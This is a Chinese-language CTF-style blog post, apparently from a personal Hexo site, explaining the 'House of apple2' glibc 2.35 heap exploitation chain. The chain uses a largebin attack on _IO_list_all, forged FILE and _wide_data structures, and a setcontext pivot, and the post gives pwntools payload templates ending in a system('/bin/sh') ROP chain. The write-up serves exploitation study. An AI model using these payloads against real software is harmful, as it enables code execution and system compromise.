@@ -1,0 +1,52 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of apple2 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of apple2</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-16T07:57:37.000Z" id="date"> 2023-07-16</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-16T08:31:21.593Z" id="updated"> 2023-07-16</time></div></span><br><span>Word Count: <div class="control">612</div></span><br><span>Read Time: <div class="control">2 min</div></span></div></div><hr><div id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然是名为house of apple2 但是和apple1的利用没有太大的关系 当成一条全新的链就行了</p>
+<p>只需要一次largebin就可以实现的链 适用于2.35这样的高版本 触发条件为exit或者abort 需要调用到io结构体的vtable的overflow函数</p>
+<h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>触发的方式和apple1是一样的 可以通过显示调用的exit 或者是从main函数返回的隐式exit 或者是malloc_assert输出报错信息</p>
+<p>下面是通过exit触发的链</p>
+<p>exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p>
+<p>主要的思想就是劫持IO_list_all为堆地址 从而我们可以伪造io结构体</p>
+<p>这里主要注意的就是两个成员  一个是_wide_data 一个是vtable</p>
+<p>我们先说vtable 这里的思路是将其伪造为_IO_wfile_jumps </p>
+<p>这样触发io时会调用到_IO_wfile_overflow 来看一下这个函数主要的内容</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161614545.png" alt="image-20230716161414471"></p>
+<p>其内部调用了wdoallocbuf函数 这个函数存在一个任意函数调用的点</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615628.png" alt="image-20230716161503609"></p>
+<p>其索引是通过rax寄存器来的</p>
+<p>而此时的rax值 就是fakeio的0xa0偏移处的wide_data成员</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615252.png" alt="image-20230716161559230"></p>
+<p>其wide_data处要求是一个结构体指针 wdoallocbuf函数会调用该指针的vtable的overflow函数</p>
+<p>如果我们将其控制为setcontext 就可以实现一段rop 哪怕是开启了沙盒 也是适用的</p>
+<h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p>关键的伪造点就那几个 </p>
+<p>1.先要把_IO_list_all利用largebin attack先覆盖成可控地址 用来伪造结构体 下面称fakeio1</p>
+<p>2.控制fakeio1的vtable为_IO_wfile_jumps 从而调用到 _IO_wfile_overflow</p>
+<p>3.控制fakeio1的_wide_date为fakeio2</p>
+<p>4.控制fakeio2的vtable为fakeio3</p>
+<p>5.控制fakeio3的偏移0x68处为setcontext</p>
+<p>需要注意的就是最后的rop链存放的位置不能影响到fakeio的其他成员 导致程序执行流无法顺利执行</p>
+<p>还有就是之所以 不直接更改_wide_data-&gt;vtable-&gt;0x68为system函数 然后设置fakeio首地址处为&#x2F;bin&#x2F;sh  这样破坏了flag成员 无法让程序执行流按预期的执行</p>
+<p>剩下的就参考下面的模板吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fakeio1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_addr + <span class="number">0x2160c0</span></span><br><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wfile_jumps)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+fake_file</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fakeio2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr+<span class="number">0xf0</span>)+p64(ret_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)+p64(<span class="number">0</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/07/House-of-apple1/">House of apple1 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307062245113.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">链路分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">伪造分析</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
